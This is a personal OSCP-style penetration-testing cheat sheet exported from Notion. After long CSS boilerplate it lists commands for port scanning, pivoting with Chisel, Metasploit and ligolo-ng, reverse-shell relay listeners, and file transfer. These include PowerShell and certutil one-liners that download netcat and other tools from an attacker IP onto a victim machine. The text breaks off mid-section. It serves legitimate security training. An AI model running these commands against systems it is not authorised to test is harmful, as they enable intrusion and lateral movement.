<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Pen Testing Methodology</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: undefined; }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-transparentGray { background-color: undefined; }
.select-value-color-translucentGray { background-color: undefined; }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="d999e30e-4b62-41fe-8c83-47b2dfb5dd62" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/woodcuts_1.jpg" style="object-position:center 90%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">✅</span></div><h1 class="page-title">Pen Testing Methodology</h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg aria-hidden="true" role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td></td></tr></tbody></table></header><div class="page-body"><blockquote id="aeaf5bc1-6d8f-47d9-bcc0-897d01ff1747" class=""><em>The cheatsheet that helped me pass the OSCP and beyond…</em></blockquote><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Port Scanning</summary><div class="indented"><ul id="f8833aff-1c28-419a-a926-7d59a4c236b5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Fast - <code>nmap -F -A $IP</code></span><div class="indented"></div></li></ul><ul id="6550a381-c92a-44d0-98a3-00e3460dbf7f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">rustscan - <code>rustscan $IP -- -sCV -Pn</code></span><div class="indented"></div></li></ul><ul id="0f123c15-d352-451b-82bc-9bca31716a1c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Long - <code>nmap -p- -v -sT $IP</code></span><div class="indented"><p id="5f87ef69-8ca8-4120-95ad-4838fc1256fb" class=""><code>nmap -p- -v $IP</code></p></div></li></ul><ul id="33788e12-1ebc-4bbe-b722-82046760f6b9" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">UDP - <code>sudo nmap -v -sU --top-ports 1000 $IP</code></span><div class="indented"></div></li></ul><ul id="bce0d54a-47ee-43b4-82cd-45a256c632d6" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Script scan - <code>nmap -sCV -p $ports $IP</code></span><div class="indented"></div></li></ul><ul id="59d78a6e-ade6-4b01-8225-e683fd88221d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Ping Sweep - <code>nmap -sn $SUBNET</code></span><div class="indented"></div></li></ul><ul id="8c4618f4-29f8-45c2-8467-99489ec5f48e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Autorecon?</span><div class="indented"></div></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Notes</summary><div class="indented"><ul id="e7cefea5-c99f-4df7-8fbb-38edccb9f62a" class="toggle"><li><details open=""><summary>Port Forwarding</summary><p id="2f1991ad-e08d-4c65-ba7f-d81c89547436" class="">Check connection - <code><strong>ss -antp</strong></code></p><ul id="8a4db24f-c0eb-45ef-9d3f-81885af73c38" class="toggle"><li><details open=""><summary>SSH</summary><p id="4eaaed37-4fcb-4c15-8740-d75d508d5689" class=""><code>sudo ssh -L &lt;forwarding port&gt;:&lt;remote IP&gt;:&lt;remote port&gt; &lt;remote username&gt;@&lt;remote IP&gt;</code></p></details></li></ul><ul id="03fda891-7ef2-4071-ba3b-3d0c289301b0" class="toggle"><li><details open=""><summary>Chisel</summary><p id="a3943ece-b92b-4ded-9c29-6321be917474" class=""><strong>On attacking</strong></p><p id="bbff71fc-326d-4bfd-82b3-c657ec078fda" class=""><code>./chisel_linux server --port 8000 --reverse</code></p><p id="96b8b076-2262-4b1e-9a74-0c8f442d6e5f" class=""><strong>On victim</strong></p><p id="5a7f4b26-9ede-47a5-ae9e-8e8d4cc394c7" class=""><code>.\chisel client &lt;ATTACKER IP&gt;:8000 R:socks</code></p><p id="ba53d575-4253-479a-9053-608cdd8704ae" class=""><code>proxychains -q &lt;COMMAND&gt;</code></p></details></li></ul><ul id="6c4b780f-09b1-415e-aa73-88df431d52a3" class="toggle"><li><details open=""><summary>Metasploit</summary><p id="78f7be84-457d-414d-b8d8-e9d0793d8a67" class="">In Meterpreter session:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de36bf00-15c6-4ad9-bcda-4b66491e57aa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">run autoroute -s 10.9.1.0/24
run autoroute -p</code></pre><p id="0f8d760c-e3fe-4448-a9d0-50b95a16bde1" class="">portfwd:</p><p id="e56ce799-1e4f-477a-a31a-750478ca9c90" class=""><code>portfwd add -l &lt;LPORT&gt; -p &lt;RPORT&gt; -r &lt;RHOST&gt;</code></p><p id="bbf191e3-b763-4c8e-a669-2ac1523a51f6" class="">Reverse:</p><p id="81355d17-0ce8-4db2-972e-7159eae08d63" class=""><code>portfwd add -R -L &lt;LHOST&gt; -l &lt;LPORT&gt; -p &lt;RPORT&gt;</code></p><p id="612a94d1-328f-41f3-b0a5-3cea9b58c781" class="">
</p></details></li></ul><ul id="17c686af-f635-8090-8c79-f6e97018ad12" class="toggle"><li><details open=""><summary>linogo-ng</summary><ul id="17c686af-f635-80b7-9761-e99027c25027" class="toggle"><li><details open=""><summary>Setup</summary><p id="17c686af-f635-80cb-b33d-e9df32196c4e" class="">Adds a new tun interface to our machine.</p><p id="17c686af-f635-8053-a47f-ef9d5c11d313" class=""><code>sudo ip tuntap add user kali mode tun ligolo</code></p><p id="17c686af-f635-803c-94d7-e5278bc077fe" class="">Enables the new interface.</p><p id="17c686af-f635-8070-820a-cfa7ba126470" class=""><code>sudo ip link set ligolo up</code></p><p id="17c686af-f635-8077-8078-fb470ded39c4" class="">Run proxy</p><p id="17c686af-f635-8067-a83e-c771e6066175" class=""><code>./proxy -selfcert -laddr 0.0.0.0:443 </code></p><p id="17c686af-f635-80c1-86b3-cbb363ee6553" class="">Connect ligolo agent</p><p id="17c686af-f635-8044-8e70-e57341c0af12" class=""><code>./agent -connect &lt;IP ADDRESS&gt;:443 -ignore-cert</code></p><p id="17c686af-f635-801b-b750-cfb581d17395" class="">view network sessions</p><p id="17c686af-f635-80ed-bd6a-fe5333835129" class=""><code>session</code></p><p id="17c686af-f635-80a4-abb7-ea6c47d6ac27" class="">begin tunnel</p><p id="17c686af-f635-80b7-82d1-c410e17e656d" class=""><code>start</code></p><p id="17c686af-f635-80d3-b7fd-db92af240e12" class="">Add route</p><p id="17c686af-f635-8032-a560-fefaba5a6739" class=""><code>sudo ip route add &lt;subnet&gt;/24 dev ligolo</code></p><p id="17c686af-f635-8078-a923-e8ea3e025a18" class="">view routes</p><p id="17c686af-f635-808a-b5c3-da7b1e9e62c3" class=""><code>ip route list</code></p></details></li></ul><ul id="17c686af-f635-809e-9506-cb8938abc241" class="toggle"><li><details open=""><summary>nmap</summary><p id="17c686af-f635-80b0-ad4d-fdc209403f51" class=""><code>nmap -Pn -v &lt;subnet&gt; </code></p><p id="17c686af-f635-80d2-af87-cfc1b553b853" class=""><code>nmap -sV --unprivileged -Pn</code></p></details></li></ul><ul id="17c686af-f635-806a-a4a0-ff0c661898ac" class="toggle"><li><details open=""><summary>File Transfer</summary><p id="17c686af-f635-8058-9824-fa1a94549dd0" class="">On attacker machine:</p><p id="17c686af-f635-805d-8551-e2ab395364be" class=""><code>listener_add --addr 0.0.0.0:&lt;PIVOT MACHINE PORT&gt; --to 127.0.0.1:&lt;ATTACKER PORT&gt; --tcp</code></p></details></li></ul><ul id="17c686af-f635-80b1-890d-ef6a404abb52" class="toggle"><li><details open=""><summary>Reverse Shell</summary><p id="17c686af-f635-806c-b6af-c5c0456b28cc" class=""><code>listener_add --addr 0.0.0.0:&lt;PIVOT MACHINE PORT&gt; --to 127.0.0.1:&lt;ATTACKER PORT&gt; --tcp</code></p><p id="17c686af-f635-807d-96ac-fea4df5bf347" class="">Set reverse shell to connect to pivot machine IP and port!</p></details></li></ul></details></li></ul></details></li></ul><ul id="26c7ee2c-0aba-4082-a2e8-b73c5fea36d8" class="toggle"><li><details open=""><summary>scp</summary><ul id="80450dbb-5f74-4cd7-a7c4-38c46870381e" class="toggle"><li><details open=""><summary>Copy Local File to Remote</summary><p id="98cf3481-ac21-4ab4-b096-f3be399ad134" class=""><code>scp file.txt &lt;remote_username&gt;@&lt;remote_ip&gt;:/remote/directory</code></p></details></li></ul><ul id="b7557e4a-6f54-4006-a977-5568eb18a1f9" class="toggle"><li><details open=""><summary>Copy Remote File to Local</summary><p id="2767160e-0b00-4e65-91f3-b836d4d11070" class=""><code>scp &lt;remote_username&gt;@&lt;remote_ip&gt;:/remote/file.txt /local/directory</code></p></details></li></ul></details></li></ul><ul id="29f844e1-953e-41b8-9a04-5148a69374cd" class="toggle"><li><details open=""><summary>CMD download file</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9e08b7a-96bc-41cc-86b8-418c6bf679e2" class="code"><code class="language-PowerShell">powershell -c &quot;Invoke-WebRequest -Uri &#x27;192.168.119.131/nc64.exe&#x27; -OutFile &#x27;nc64.exe&#x27;&quot;

certutil.exe -urlcache -split -f http://&lt;IP&gt; &lt;outname&gt;

powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;&lt;URI&gt;&#x27;,&#x27;&lt;Download Location&gt;&#x27;)&quot;</code></pre><p id="17d686af-f635-808e-b74c-e90337a16957" class="">
</p></details></li></ul><ul id="e21c9b71-bbf6-434c-8bfb-b55c4e46dad7" class="toggle"><li><details open=""><summary>SMB File Transfer</summary><p id="e179a41a-3141-4f08-806d-fdfd96f24377" class=""><code>cd /usr/share/doc/python3-impacket/examples</code></p><p id="172686af-f635-80af-846d-cea50439b784" class=""><code>cp /usr/share/doc/python3-impacket/examples/smbserver.py .</code></p><ul id="172686af-f635-80b8-a56e-fa669e5f8b12" class="toggle"><li><details open=""><summary>password</summary><p id="172686af-f635-8022-9fcd-c4e0f2b5a01c" class=""><code>python3 </code><code><a href="http://smbserver.py/">smbserver.py</a></code><code> -smb2support share . -user user -password password123</code></p><p id="172686af-f635-80cb-bd4a-c4560c1f0898" class="">from victim: </p><p id="172686af-f635-8002-9c8c-c64a4881c3e3" class=""><code>$pass = convertto-securestring &#x27;password123&#x27; -AsPlainText -Force</code></p><p id="172686af-f635-8052-88c7-e7a096ff0265" class=""><code>$cred = New-Object System.Management.Automation.PSCredential(&#x27;user&#x27;, $pass)</code></p><p id="172686af-f635-80bc-af9c-cad6ec5d2aa3" class=""><code>New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\IP ADDRESS\share</code></p></details></li></ul><ul id="172686af-f635-801a-9fe2-d73911c01960" class="toggle"><li><details open=""><summary>no password</summary><p id="172686af-f635-80c2-8c00-d7670ca907d4" class=""><code>python3 </code><code><a href="http://smbserver.py/">smbserver.py</a></code><code> -smb2support share .</code></p></details></li></ul><p id="bfd1628b-7925-4f69-83d0-c88941d99a83" class="">from victim 